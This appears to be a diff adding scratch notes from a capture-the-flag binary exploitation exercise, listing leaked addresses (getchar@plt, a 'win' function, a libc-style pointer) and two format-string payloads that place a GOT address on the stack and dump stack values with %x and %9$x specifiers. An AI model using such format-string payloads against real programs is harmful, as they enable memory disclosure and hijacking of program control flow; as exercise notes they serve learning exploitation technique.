@@ -1,0 +1,13 @@
+First Memory Leak: 56559ed4
+
+getchar@plt 56559cbc/5655acbc
+
+win 5655655c
+
+56559cbc 56559cbd 56559cbe 56559cbf
+0xf7e35254
+
+
+\xbc\x9c\x55\x56%x%9$x
+
+\xbc\x9c\x55\x56.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
